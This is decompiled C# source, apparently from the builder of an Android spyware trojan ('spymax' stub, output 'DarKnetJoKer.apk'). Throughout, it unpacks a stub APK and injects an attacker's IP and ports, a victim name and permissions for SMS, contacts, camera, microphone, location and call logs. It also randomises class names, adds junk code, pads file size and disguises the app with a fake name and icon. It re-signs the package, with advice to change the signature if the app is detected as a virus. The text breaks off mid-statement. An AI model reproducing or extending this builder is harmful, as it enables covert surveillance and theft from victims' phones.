			folder_apktool = folder_building + "\\platformBinary64\\bin";
		}
		else
		{
			folder_apktool = folder_building + "\\platformBinary32\\bin";
		}
		try
		{
			if (Directory.Exists(folder_building) & oncedelete)
			{
				oncedelete = false;
				LogB("Deleting old Files...");
				LogB("Please Wait...");
				Codes.DirectoryDeleteLong(folder_building);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			LogB("File delete old" + ex2.Message);
			ProjectData.ClearProjectError();
		}
		try
		{
			while (true)
			{
				if (!Directory.Exists(folder_building))
				{
					Directory.CreateDirectory(folder_building);
					continue;
				}
				vulTrack = 20;
				if (Directory.Exists(folder_apktool))
				{
					break;
				}
				Directory.CreateDirectory(folder_apktool);
			}
			vulTrack = 30;
			if (Directory.Exists(folder_apktool))
			{
				try
				{
					if (Directory.GetFiles(folder_apktool, "*.*").Count() == 0)
					{
						LogB("Extracting New Files...");
						Codes.File_zip_Decompress(path_apktool, folder_building);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			vulTrack = 35;
			while (true)
			{
				Thread.Sleep(_Time);
				LogB("Read Configuration...");
				if (!(Directory.Exists(folder_building) & Directory.Exists(folder_apktool)))
				{
					break;
				}
				try
				{
					string path = folder_apktool + "\\temp";
					if (Directory.Exists(folder_apktool + "\\temp"))
					{
						Directory.Delete(path, recursive: true);
					}
					if (File.Exists(folder_apktool + "\\temp.apk"))
					{
						File.Delete(folder_apktool + "\\temp.apk");
					}
					if (File.Exists(folder_apktool + "\\output\\ready.apk"))
					{
						File.Delete(folder_apktool + "\\output\\ready.apk");
					}
					if (Operators.CompareString(HIDETYPE, "TEN", TextCompare: false) == 0)
					{
						File.WriteAllBytes(folder_apktool + "\\temp.apk", Resources.MYSTUBTEN);
					}
					else
					{
						File.WriteAllBytes(folder_apktool + "\\temp.apk", Resources.MYSTUB);
					}
					if (CMD_running())
					{
						vulTrack = 40;
						NewLateBinding.LateCall(NewLateBinding.LateGet(CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[1] { "cd " + folder_apktool }, null, null, null, IgnoreReturn: true);
						NewLateBinding.LateCall(NewLateBinding.LateGet(CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[1] { "java -version" }, null, null, null, IgnoreReturn: true);
						LogB("Working...");
					}
					break;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			Close();
			ProjectData.ClearProjectError();
		}
	}

	private bool CMD_running()
	{
		bool result;
		try
		{
			CMD = new Process();
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(CMD, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardOutput", new object[1] { true }, null, null, OptimisticSet: false, RValueBase: true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(CMD, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardInput", new object[1] { true }, null, null, OptimisticSet: false, RValueBase: true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(CMD, null, "StartInfo", new object[0], null, null, null), null, "RedirectStandardError", new object[1] { true }, null, null, OptimisticSet: false, RValueBase: true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(CMD, null, "StartInfo", new object[0], null, null, null), null, "FileName", new object[1] { "cmd.exe" }, null, null, OptimisticSet: false, RValueBase: true);
			((Process)CMD).OutputDataReceived += Sync_Output;
			((Process)CMD).ErrorDataReceived += Sync_Output;
			((Process)CMD).Exited += [SpecialName] [DebuggerHidden] (object sender, EventArgs e) =>
			{
				ex();
			};
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(CMD, null, "StartInfo", new object[0], null, null, null), null, "UseShellExecute", new object[1] { false }, null, null, OptimisticSet: false, RValueBase: true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(CMD, null, "StartInfo", new object[0], null, null, null), null, "CreateNoWindow", new object[1] { true }, null, null, OptimisticSet: false, RValueBase: true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(CMD, null, "StartInfo", new object[0], null, null, null), null, "WindowStyle", new object[1] { ProcessWindowStyle.Hidden }, null, null, OptimisticSet: false, RValueBase: true);
			NewLateBinding.LateSet(CMD, null, "EnableRaisingEvents", new object[1] { true }, null, null);
			NewLateBinding.LateCall(CMD, null, "Start", new object[0], null, null, null, IgnoreReturn: true);
			NewLateBinding.LateCall(CMD, null, "BeginOutputReadLine", new object[0], null, null, null, IgnoreReturn: true);
			NewLateBinding.LateCall(CMD, null, "BeginErrorReadLine", new object[0], null, null, null, IgnoreReturn: true);
			result = true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			result = false;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public void Sync_Output(object d01, object b01)
	{
		try
		{
			if (base.InvokeRequired)
			{
				Delegate0 method = Sync_Output;
				Invoke(method, d01, b01);
				return;
			}
			if (string.IsNullOrEmpty(Conversions.ToString(NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null))))
			{
				return;
			}
			Thread.Sleep(1);
			if (NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("OpenJDK"))
			{
				if (!Once)
				{
					NewLateBinding.LateCall(NewLateBinding.LateGet(CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[1] { "apktool d temp.apk" }, null, null, null, IgnoreReturn: true);
					Once = true;
				}
			}
			else if (NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("java -jar SignApk.jar") | NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("java -jar " + folder_apktool + "\\SignApk.jar "))
			{
				Step3();
			}
			else if (NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("Copying original files"))
			{
				Thread thread = new Thread(Step2);
				thread.IsBackground = true;
				thread.Start();
			}
			else if (NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("Built apk"))
			{
				try
				{
					CheckFakeSize.Checked = true;
					if ((!pumpfinished || !pumpstarted) && !firstpump)
					{
						if (CheckBIND.Checked)
						{
							TextSize.Text = "1";
						}
						firstpump = true;
						while (!File.Exists(folder_apktool + "\\temp\\build\\apk\\res\\drawable-xxxhdpi\\freespace.png"))
						{
							Thread.Sleep(_Time);
						}
						NewFakeSize = Conversions.ToInteger(TextSize.Text);
						while (true)
						{
							if (!pumpstarted)
							{
								if (File.Exists(folder_apktool + "\\temp\\dist\\temp.apk"))
								{
									File.Delete(folder_apktool + "\\temp\\dist\\temp.apk");
								}
								LogB("Resize Apk");
								pumpstarted = true;
								Pumper(checked(NewFakeSize * 1000));
								Thread.Sleep(1000);
							}
							else
							{
								if (pumpfinished)
								{
									break;
								}
								Thread.Sleep(1000);
							}
						}
						NewLateBinding.LateCall(NewLateBinding.LateGet(CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[1] { "apktool b temp" }, null, null, null, IgnoreReturn: true);
						LogB("Rebuild apk");
						goto IL_06ee;
					}
				}
				catch (Exception)
				{
					Thread.Sleep(_Time);
					goto IL_032c;
				}
				goto IL_0315;
			}
			goto IL_06ee;
			IL_0315:
			while (!File.Exists(folder_apktool + "\\temp\\dist\\temp.apk"))
			{
				Thread.Sleep(5000);
				LogB("Wating...");
			}
			goto IL_032c;
			IL_06ee:
			if (!FolderApk)
			{
				string text = NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString();
				if (NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("[PROTECT] Saved to"))
				{
					protectfinished = true;
				}
				if (NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().StartsWith("I:"))
				{
					LogB(text.Replace("I:", ""));
				}
				else if (NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("[PROTECT]") && !NewLateBinding.LateGet(b01, null, "Data", new object[0], null, null, null).ToString().Contains("Writing:"))
				{
					LogB(text);
				}
			}
			return;
			IL_032c:
			string text2 = "";
			if (checkprotector.Checked)
			{
				text2 = "_protected";
				while (true)
				{
					if (!encrypt_started)
					{
						encrypt_started = true;
						LogB(" Encryption V3...");
						File.WriteAllBytes(folder_apktool + "\\temp\\dist\\Crypt.jar", Resources.APKEditor);
						string text3 = "java -jar temp\\dist\\Crypt.jar p -i \"" + folder_apktool + "\\temp\\dist\\temp.apk\"";
						object instance = NewLateBinding.LateGet(CMD, null, "StandardInput", new object[0], null, null, null);
						object[] obj = new object[1] { text3 };
						object[] array = obj;
						bool[] obj2 = new bool[1] { true };
						bool[] array2 = obj2;
						NewLateBinding.LateCall(instance, null, "WriteLine", obj, null, null, obj2, IgnoreReturn: true);
						if (array2[0])
						{
							text3 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
						}
					}
					else
					{
						if (!(!File.Exists(folder_apktool + "\\temp\\dist\\temp_protected.apk") | !protectfinished))
						{
							break;
						}
						Thread.Sleep(1000);
						Application.DoEvents();
					}
				}
			}
			if (!StartedZip)
			{
				if (!StartedZip)
				{
					NewLateBinding.LateCall(NewLateBinding.LateGet(CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[1] { "zipalign.exe -v 4 " + folder_apktool + "\\temp\\dist\\temp" + text2 + ".apk " + folder_apktool + "\\temp\\dist\\tempzip.apk " }, null, null, null, IgnoreReturn: true);
					LogB(" Verification...");
					StartedZip = true;
				}
				Thread.Sleep(5000);
				goto IL_0315;
			}
			LogB("Apk Signing...");
			File.Delete(folder_apktool + "\\certificate.pem");
			File.Delete(folder_apktool + "\\key.pk8");
			string text4 = "if the App detected as virus on the phone , try change signature version";
			string language = RegistryHandler.Get_Language();
			text4 = ((Operators.CompareString(language, "AR", TextCompare: false) == 0) ? ("\r\n<------->\r\n" + Codes.Translate(text4, "en", "ar") + "\r\n<------->") : ((Operators.CompareString(language, "CN", TextCompare: false) == 0) ? ("\r\n<------->\r\n" + Codes.Translate(text4, "en", "zh") + "\r\n<------->") : ("\r\n<------->\r\n" + text4 + "\r\n<------->")));
			if (Operators.CompareString(checksignver.Text, "V3", TextCompare: false) == 0)
			{
				LogB("signature V3...");
				File.WriteAllBytes(folder_apktool + "\\certificate.pem", Resources.c);
				File.WriteAllBytes(folder_apktool + "\\key.pk8", Resources.k);
			}
			else
			{
				LogB("signature V3...");
				File.WriteAllBytes(folder_apktool + "\\certificate.pem", Resources.C2);
				File.WriteAllBytes(folder_apktool + "\\key.pk8", Resources.K2);
			}
			LogB(text4);
			NewLateBinding.LateCall(NewLateBinding.LateGet(CMD, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[1] { "java -jar " + folder_apktool + "\\SignApk.jar sign --key " + folder_apktool + "\\key.pk8 --cert " + folder_apktool + "\\certificate.pem  --v3-signing-enabled true --v4-signing-enabled true --out " + folder_apktool + "\\output\\DarKnetJoKer.apk " + folder_apktool + "\\temp\\dist\\temp" + text2 + ".apk " }, null, null, null, IgnoreReturn: true);
			FolderApk = true;
			goto IL_06ee;
		}
		catch (Exception)
		{
		}
	}

	public void Pumper(int NewSize)
	{
		checked
		{
			try
			{
				double num = Conversion.Val(NewSize);
				num *= 1024.0;
				string text = Randomunicode(5, 15);
				string text2 = Path.GetTempPath() + "\\" + text + ".png";
				Resources.low.Save(text2);
				FileStream fileStream = File.OpenWrite(text2);
				long num2 = fileStream.Seek(0L, SeekOrigin.End);
				bool flag = false;
				for (; (double)num2 < num; num2++)
				{
					if (flag)
					{
						flag = false;
						fileStream.WriteByte(0);
					}
					else
					{
						flag = true;
						fileStream.WriteByte(1);
					}
				}
				fileStream.Close();
				string text3 = folder_apktool + "\\temp\\res\\drawable-xxxhdpi\\freespace.png";
				if (File.Exists(text3))
				{
					File.Delete(text3);
				}
				File.Move(text2, text3);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.MsgBox("Resize apk error 1 " + ex2.Message);
				ProjectData.ClearProjectError();
			}
			try
			{
				double num3 = Conversion.Val(NewSize);
				num3 *= 1024.0;
				string text4 = Randomunicode(5, 15);
				string text5 = Path.GetTempPath() + "\\" + text4 + ".png";
				Resources.low.Save(text5);
				FileStream fileStream2 = File.OpenWrite(text5);
				long num4 = fileStream2.Seek(0L, SeekOrigin.End);
				bool flag2 = false;
				for (; (double)num4 < num3; num4++)
				{
					if (flag2)
					{
						flag2 = false;
						fileStream2.WriteByte(0);
					}
					else
					{
						flag2 = true;
						fileStream2.WriteByte(1);
					}
				}
				fileStream2.Close();
				string text6 = folder_apktool + "\\temp\\build\\apk\\res\\drawable-xxxhdpi\\freespace.png";
				if (File.Exists(text6))
				{
					File.Delete(text6);
				}
				File.Move(text5, text6);
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				Interaction.MsgBox("Resize apk error 2 " + ex4.Message);
				ProjectData.ClearProjectError();
			}
			pumpfinished = true;
		}
	}

	private async void Step3()
	{
		LOGEND("\r\n->Finishing");
		string path;
		do
		{
			LOGEND(".");
			Thread.Sleep(100);
			path = folder_apktool + "\\output\\DarKnetJoKer.apk";
		}
		while (!File.Exists(path));
		vulTrack = 85;
		_ = DateTime.Now;
		LogB("+----------- informations -----------+");
		LogB("name patch:" + namepatch);
		LogB("version:" + version);
		checked
		{
			if (ports.Contains(":"))
			{
				LogB("DNS/ip:port");
				string[] array = ip.Split(new string[1] { ":" }, StringSplitOptions.None);
				string[] array2 = ports.Split(new string[1] { ":" }, StringSplitOptions.None);
				int num = array2.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					LogB(array[i] + ":" + array2[i]);
				}
			}
			else
			{
				LogB("DNS/ip:" + ip);
				LogB("port:" + ports);
			}
			while (true)
			{
				Thread.Sleep(1);
				if (File.Exists(folder_apktool + "\\output\\info.inf"))
				{
					break;
				}
				LogB("-------------------");
				File.Create(folder_apktool + "\\output\\info.inf").Close();
				Thread.Sleep(1);
			}
			File.WriteAllText(folder_apktool + "\\output\\info.inf", "name patch:" + namepatch + "\r\nversion:" + version + "\r\nDNS/ip:" + ip + "\r\nport:" + ports);
			vulTrack = 100;
			await Task.Factory.StartNew(delegate
			{
				OKY();
			}, TaskCreationOptions.None);
			Builtapk = true;
		}
	}

	private void OKY()
	{
		if (FolderApk)
		{
			int num = 0;
			do
			{
				Thread.Sleep(1000);
				num = checked(num + 1);
			}
			while (num <= 5);
			Process.Start(folder_apktool + "\\output");
		}
	}

	private void Step2()
	{
		checked
		{
			while (true)
			{
				Thread.Sleep(_Time);
				string path = folder_apktool + "\\temp\\res\\values\\strings.xml";
				string path2 = folder_apktool + "\\temp\\res\\values\\public.xml";
				if (!File.Exists(reso.Junkpath))
				{
					File.WriteAllBytes(reso.Junkpath, Resources.junk);
				}
				string text = File.ReadAllText(reso.Junkpath);
				try
				{
					if (!File.Exists(path2))
					{
						Thread.Sleep(_Time);
						continue;
					}
					string contents = File.ReadAllText(path2).Replace(Resources.GSTART, " ");
					File.Delete(path2);
					File.WriteAllText(path2, contents);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					Thread.Sleep(_Time);
					ProjectData.ClearProjectError();
					continue;
				}
				string path3 = folder_apktool + "\\temp\\apktool.yml";
				string path4 = folder_apktool + "\\temp\\AndroidManifest.xml";
				string path5 = folder_apktool + "\\temp\\res\\values\\public.xml";
				string text2 = folder_apktool + "\\temp\\res\\layout\\q1q2q3q4q5q6.xml";
				string text3 = folder_apktool + "\\temp\\res\\layout\\s1s2s3s4s5s6.xml";
				string path6 = folder_apktool + "\\temp\\res\\xml\\prov_path.xml";
				try
				{
					if (!File.Exists(path6))
					{
						Thread.Sleep(_Time);
						continue;
					}
					string text4 = File.ReadAllText(path6);
					File.WriteAllText(path6, text4.Replace("suffix", flavor).Replace("spymax", pack1).Replace("stub7", pack2));
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					Thread.Sleep(_Time);
					ProjectData.ClearProjectError();
					continue;
				}
				if (File.Exists(path))
				{
					string path7 = folder_apktool + "\\temp\\res\\layout\\activity_req_access.xml";
					while (!File.Exists(path7))
					{
						Thread.Sleep(_Time);
					}
					string contents2 = File.ReadAllText(path7).Replace("[LOG-TITLE]", logtitletext.Text).Replace("[MY-NAME]", namepatch)
						.Replace("[LOG-BODY]", logbodytext.Text.Replace("\r\n", "\\n"))
						.Replace("d1d2d3d4d5d6", Ndraw_ico)
						.Replace("[LOG-BTN]", logbtntext.Text);
					File.WriteAllText(path7, contents2);
					string path8 = folder_apktool + "\\temp\\res\\layout\\updateview.xml";
					while (!File.Exists(path8))
					{
						Thread.Sleep(_Time);
					}
					string contents3 = File.ReadAllText(path8).Replace("[MY-NAME]", bindCtitle.Text).Replace("[INST-BODY]", bindbodytext.Text.Replace("\r\n", "\\n"))
						.Replace("d1d2d3d4d5d6", Ndraw_ico)
						.Replace("[INST-BTN]", bndbtntext.Text);
					File.WriteAllText(path8, contents3);
					string path9 = folder_apktool + "\\temp\\res\\layout\\loading.xml";
					while (!File.Exists(path9))
					{
						Thread.Sleep(_Time);
					}
					string contents4 = File.ReadAllText(path9).Replace("[MY-NAME]", namepatch).Replace("d1d2d3d4d5d6", Ndraw_ico);
					File.WriteAllText(path9, contents4);
					string path10 = folder_apktool + "\\temp\\res\\xml\\accessdiecrip.xml";
					while (!File.Exists(path10))
					{
						Thread.Sleep(_Time);
					}
					string contents5 = File.ReadAllText(path10).Replace("suffix", flavor).Replace("spymax", pack1)
						.Replace("stub7", pack2)
						.Replace("activz", Nactivz)
						.Replace("servziz", Nservziz)
						.Replace("ClassGen12", NClassGen12);
					File.WriteAllText(path10, contents5);
					vulTrack = 50;
					if (rnd == null)
					{
						rnd = new Random();
					}
					try
					{
						string text5 = "";
						int num = 1;
						do
						{
							text5 = text5 + "    <string name=\"" + randmid[rnd.Next(0, randmid.Length)] + RandommClass(10, 15) + "\">" + randmid[rnd.Next(0, randmid.Length)] + RandommMad(25, 50) + "</string>\r\n";
							num++;
						}
						while (num <= 450);
						string contents6 = File.ReadAllText(path).Replace(Resources.GRESSTR, text5).Replace("[CYPHER_VICTIM]", namevictim)
							.Replace("[CYPHER_PATCH]", namepatch)
							.Replace("CYPHER_PATCH", namepatch)
							.Replace("[CYPHER_VERSION]", version)
							.Replace("[CYPHER_PROPERTY]", proprty)
							.Replace("[CYPHER_SLEEP]", sleepms)
							.Replace("[CYPHER_BIND]", BIND_EX)
							.Replace("[DISCRIP]", dscriptext.Text)
							.Replace("[CYPHER_PERMI]", PRIMS)
							.Replace("j1j2j3j4j5j6", NresoString0)
							.Replace("c1c2c3c4c5c6", NresoString1)
							.Replace("z1z2z3z4z5z6", NresoString2)
							.Replace("f1f2f3f4f5f6", NresoString3)
							.Replace("h1h2h3h4h5h6", NresoString4)
							.Replace("t1t2t3t4t5t6", NresoString5)
							.Replace("n1n2n3n4n5n6", NresoString6)
							.Replace("i1i2i3i4i5i6", NresoString7)
							.Replace("k1k2k3k4k5k6", NresoString8)
							.Replace("o1o2o3o4o5o6", NresoString9)
							.Replace("u1u2u3u4u5u6", NresoString10)
							.Replace("e1e2e3e4e5e6", NresoString11)
							.Replace("y1y2y3y4y5y6", NresoString12)
							.Replace("b1b2b3b4b5b6", Napp_reso0)
							.Replace("d1d2d3d4d5d6", Ndraw_ico)
							.Replace("x1x2x3x4x5x6", Ndraw_notifi)
							.Replace("q1q2q3q4q5q6", NwebXML)
							.Replace("s1s2s3s4s5s6", NnotifiXML);
						File.WriteAllText(path, contents6);
						vulTrack = 60;
						while (true)
						{
							Thread.Sleep(_Time);
							if (!File.Exists(path3))
							{
								Thread.Sleep(_Time);
								continue;
							}
							try
							{
								string contents7 = File.ReadAllText(path3).Replace("3.31.165", version).Replace("818", APKVERSION)
									.Replace("331165", version.Replace(".", ""));
								File.WriteAllText(path3, contents7);
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								Thread.Sleep(_Time);
								ProjectData.ClearProjectError();
								continue;
							}
							break;
						}
						vulTrack = 65;
						while (true)
						{
							Thread.Sleep(_Time);
							if (File.Exists(path4))
							{
								break;
							}
							Thread.Sleep(_Time);
						}
						if (checkcatpure.Checked)
						{
							MonitorPack = "";
							if (listmonitor.Items.Count > 0)
							{
								foreach (object item in listmonitor.Items)
								{
									object objectValue = RuntimeHelpers.GetObjectValue(item);
									ref string monitorPack = ref MonitorPack;
									monitorPack = Conversions.ToString(Operators.AddObject(monitorPack, Operators.AddObject(objectValue, "!")));
								}
							}
						}
						string text6 = "";
						if (Primslist.Items.Count > 0)
						{
							foreach (object item2 in Primslist.Items)
							{
								string text7 = Conversions.ToString(item2);
								try
								{
									switch (text7)
									{
									case "Read Contacts":
										Prim_readcontact = "android.permission.READ_CONTACTS";
										text6 += "    <uses-permission android:name=\"android.permission.READ_CONTACTS\"  />\r\n";
										break;
									case "Read SMS":
										Prim_readsms = "android.permission.READ_SMS";
										text6 += "    <uses-permission android:name=\"android.permission.READ_SMS\" />\r\n";
										break;
									case "Change Wallpaper":
										Prim_wallpaper = "android.permission.SET_WALLPAPER";
										text6 += "    <uses-permission android:name=\"android.permission.SET_WALLPAPER\" />\r\n";
										break;
									case "Location":
										Prim_loacation1 = "android.permission.ACCESS_COARSE_LOCATION";
										Prim_loacation2 = "android.permission.ACCESS_FINE_LOCATION";
										Prim_loacation3 = "no";
										text6 += "    <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\" />\r\n";
										text6 += "    <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"  />\r\n";
										break;
									case "Make Calls":
										text6 += "    <uses-permission android:name=\"android.permission.CALL_PHONE\" />\r\n";
										Prim_callphone = "android.permission.CALL_PHONE";
										break;
									case "Send SMS":
										Prim_sendsms = "android.permission.SEND_SMS";
										text6 += "    <uses-permission android:name=\"android.permission.SEND_SMS\" />\r\n";
										break;
									case "Read Accounts":
										Prim_readacounts = "android.permission.GET_ACCOUNTS";
										text6 += "    <uses-permission android:name=\"android.permission.GET_ACCOUNTS\"  />\r\n";
										break;
									case "Camera":
										Prim_camera = "android.permission.CAMERA";
										text6 += "    <uses-permission android:name=\"android.permission.CAMERA\"  />\r\n";
										break;
									case "Read Call Logs":
										Prim_calllog = "android.permission.READ_CALL_LOG";
										text6 += "    <uses-permission android:name=\"android.permission.READ_CALL_LOG\"  />\r\n";
										break;
									case "Microphone":
										Prim_microphone = "android.permission.RECORD_AUDIO";
										text6 += "    <uses-permission android:name=\"android.permission.RECORD_AUDIO\" />\r\n";
										break;
									}
								}
								catch (Exception projectError4)
								{
									ProjectData.SetProjectError(projectError4);
									ProjectData.ClearProjectError();
								}
							}
						}
						string text8 = File.ReadAllText(path4).Replace(Resources.Toreplaceprim, text6).Replace(Resources.HIDECODE, Resources.SDK29);
						if (text8.Contains("suffix"))
						{
							text8 = text8.Replace("suffix", flavor).Replace("spymax", pack1).Replace("stub7", pack2)
								.Replace("ClassGen0", NClassGen0)
								.Replace(Resources.HIDECODE, Resources.SDK29)
								.Replace("ClassGen1", NClassGen1)
								.Replace("ClassGen2", NClassGen2)
								.Replace("ClassGen3", NClassGen3)
								.Replace("ClassGen4", NClassGen4)
								.Replace("ClassGen5", NClassGen5)
								.Replace("ClassGen6", NClassGen6)
								.Replace("ClassGen8", NClassGen8)
								.Replace("ClassGen9", NClassGen9)
								.Replace("ClassGen10", NClassGen10)
								.Replace("ClassGen11", NClassGen11)
								.Replace("ClassGen12", NClassGen12)
								.Replace("ClassGen13", NClassGen13)
								.Replace("activz", Nactivz)
								.Replace("servziz", Nservziz)
								.Replace("tolziz", Ntolziz)
								.Replace("brodatz", Nbrodatz)
								.Replace("ClassGen14", NClassGen14)
								.Replace("_ask_battary_", N_ask_battary_)
								.Replace("_ask_draw_", N_ask_draw_)
								.Replace("_sc_fb_", N_sc_fb_)
								.Replace("_news_g_", N_news_g_)
								.Replace("_strt_view_", N_strt_view_)
								.Replace("_scctrl_", N_scctrl_)
								.Replace("_access_ask_", N_access_ask_)
								.Replace("_cap_sc_", N_cap_sc_)
								.Replace("_trns_g_", N_trns_g_)
								.Replace("_ask_prim_", N_ask_prim_)
								.Replace("_engine_wrk_", N_engine_wrk_)
								.Replace("_skin_cls_", N_skin_cls_)
								.Replace("_update_app_", N_update_app_)
								.Replace("_callr_lsnr_", N_callr_lsnr_)
								.Replace("_srv_worker_", N_srv_worker_)
								.Replace("j1j2j3j4j5j6", NresoString0)
								.Replace("c1c2c3c4c5c6", NresoString1)
								.Replace("z1z2z3z4z5z6", NresoString2)
								.Replace("f1f2f3f4f5f6", NresoString3)
								.Replace("h1h2h3h4h5h6", NresoString4)
								.Replace("t1t2t3t4t5t6", NresoString5)
								.Replace("n1n2n3n4n5n6", NresoString6)
								.Replace("i1i2i3i4i5i6", NresoString7)
								.Replace("k1k2k3k4k5k6", NresoString8)
								.Replace("o1o2o3o4o5o6", NresoString9)
								.Replace("u1u2u3u4u5u6", NresoString10)
								.Replace("e1e2e3e4e5e6", NresoString11)
								.Replace("y1y2y3y4y5y6", NresoString12)
								.Replace("b1b2b3b4b5b6", Napp_reso0)
								.Replace("d1d2d3d4d5d6", Ndraw_ico)
								.Replace("x1x2x3x4x5x6", Ndraw_notifi)
								.Replace("q1q2q3q4q5q6", NwebXML)
								.Replace("skin.name", FAKEAPPNAME)
								.Replace("trg.trgtapp.trg", TheTarget)
								.Replace("[delayacess]", delayaccesstext.Text)
								.Replace("RANDOM_STR1", RandommClass(100, 150))
								.Replace("RANDOM_STR2", RandommClass(100, 150))
								.Replace("RANDOM_STR3", RandommClass(100, 150))
								.Replace("_randomS", RandommClass(150, 200))
								.Replace("_shit_", RandommClass(150, 200))
								.Replace(Resources.HIDECODE, Resources.SDK29)
								.Replace(Resources.Toreplaceprim, text6)
								.Replace("s1s2s3s4s5s6", NnotifiXML);
							File.WriteAllText(path4, text8);
						}
						vulTrack = 70;
						string text9;
						while (true)
						{
							text9 = folder_apktool + "\\temp\\res\\drawable\\x1x2x3x4x5x6.png";
							if (File.Exists(text9))
							{
								break;
							}
							Thread.Sleep(_Time);
						}
						MyProject.Computer.FileSystem.RenameFile(text9, Ndraw_notifi + ".png");
						if (Operators.CompareString(iconPatch, "null", TextCompare: false) != 0)
						{
							if (File.Exists(iconPatch))
							{
								string path11;
								while (true)
								{
									Thread.Sleep(_Time);
									path11 = folder_apktool + "\\temp\\res\\drawable\\d1d2d3d4d5d6.png";
									string text10 = folder_apktool + "\\temp\\res\\drawable\\skinicon.png";
									try
									{
										if (Operators.CompareString(FAKEAPPicon, "null", TextCompare: false) != 0)
										{
											if (File.Exists(text10))
											{
												File.Delete(text10);
											}
											File.Copy(FAKEAPPicon, text10);
										}
									}
									catch (Exception projectError5)
									{
										ProjectData.SetProjectError(projectError5);
										ProjectData.ClearProjectError();
									}
									if (File.Exists(path11))
									{
										break;
									}
									Thread.Sleep(_Time);
								}
								File.Delete(path11);
								Image image = Codes.ResizeImage(Image.FromFile(iconPatch), new Size(144, 144));
								image.Save(folder_apktool + "\\temp\\res\\drawable\\" + Ndraw_ico + ".png");
							}
						}
						else
						{
							string text11;
							while (true)
							{
								text11 = folder_apktool + "\\temp\\res\\drawable\\d1d2d3d4d5d6.png";
								if (File.Exists(text11))
								{
									break;
								}
								Thread.Sleep(_Time);
							}
							MyProject.Computer.FileSystem.RenameFile(text11, Ndraw_ico + ".png");
						}
						if (Operators.CompareString(BIND_Path, "null", TextCompare: false) != 0)
						{
							if (File.Exists(BIND_Path))
							{
								string path12;
								while (true)
								{
									Thread.Sleep(_Time);
									path12 = folder_apktool + "\\temp\\res\\raw\\b1b2b3b4b5b6";
									if (File.Exists(path12))
									{
										break;
									}
									Thread.Sleep(_Time);
								}
								File.Delete(path12);
								File.Copy(BIND_Path, folder_apktool + "\\temp\\res\\raw\\" + Napp_reso0, overwrite: true);
							}
						}
						else
						{
							string text12;
							while (true)
							{
								text12 = folder_apktool + "\\temp\\res\\raw\\b1b2b3b4b5b6";
								if (File.Exists(text12))
								{
									break;
								}
								Thread.Sleep(_Time);
							}
							MyProject.Computer.FileSystem.RenameFile(text12, Napp_reso0);
						}
						while (true)
						{
							try
							{
								string text13;
								while (true)
								{
									text13 = folder_apktool + "\\temp\\smali\\spymax\\stub7";
									if (Directory.Exists(text13))
									{
										break;
									}
									Thread.Sleep(_Time);
								}
								int num2 = 1;
								do
								{
									string text14 = RandommMadv2(10, 15);
									File.WriteAllText(text13 + "\\" + text14 + ".smali", text.Replace("spymax", pack1).Replace("stub7", pack2).Replace("[MYNAME]", text14));
									num2++;
								}
								while (num2 <= 10);
								DirectoryInfo directoryInfo = new DirectoryInfo(text13);
								FileInfo[] files = directoryInfo.GetFiles("*.smali");
								LogB("Encryption Started\r\n---------");
								FileInfo[] array = files;
								foreach (FileInfo fileInfo in array)
								{
									string text15 = File.ReadAllText(fileInfo.FullName);
									File.WriteAllText(contents: (Operators.CompareString(fileInfo.Name.ToLower(), "buildconfig.smali", TextCompare: false) != 0) ? text15.Replace("spymax", pack1).Replace("stub7", pack2).Replace("ClassGen0", NClassGen0)
										.Replace("ClassGen1", NClassGen1)
										.Replace("ClassGen2", NClassGen2)
										.Replace("ClassGen3", NClassGen3)
										.Replace("ClassGen4", NClassGen4)
										.Replace("ClassGen5", NClassGen5)
										.Replace("ClassGen6", NClassGen6)
										.Replace("ClassGen8", NClassGen8)
										.Replace("ClassGen9", NClassGen9)
										.Replace("ClassGen10", NClassGen10)
